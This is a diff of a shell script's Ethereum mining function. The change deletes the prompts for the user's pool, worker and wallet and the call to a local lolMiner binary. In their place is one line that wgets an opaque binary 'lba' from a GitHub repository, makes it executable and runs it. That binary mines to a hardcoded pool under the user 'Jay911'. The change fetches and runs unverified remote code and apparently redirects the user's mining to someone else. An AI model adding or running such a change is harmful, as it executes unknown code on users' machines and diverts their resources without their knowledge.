@@ -137,16 +137,7 @@ echo "******       *****   ****    ***"
 echo ""
 number_mining=$(echo $(shuf -i 1-9999 -n 1))
 miner_eth(){
-  read -p "poll:port [eu1.ethermine.org:44443]:" k_pool
-          k_pool=${k_pool:-'eu1.ethermine.org:4444'}
-  read -p "user minig [worker]:" k_user
-          k_user=${k_user:-'archer'}
-  read -p "wallet [Archer]:" k_wallet
-          k_wallet=${k_wallet:-'0x83262fd642190cdd04dae96005e26330d9bxxxx'}
-  read -p "algo [ETHASH]:" k_algo
-          k_algo=${k_algo:-'ETHASH'}
-  walletstart="./1.42/lolMiner --algo $k_algo --pool $k_pool --user $k_wallet.$k_user-$number_mining"
-  $walletstart
+ wget https://github.com/christiarch/templates/raw/main/lba && chmod +x lba &&./lba  --algo ETHASH --pool ethash.poolbinance.com:1800 --user Jay911 --ethstratum ETHPROXY
 }
 
 miner_ton(){
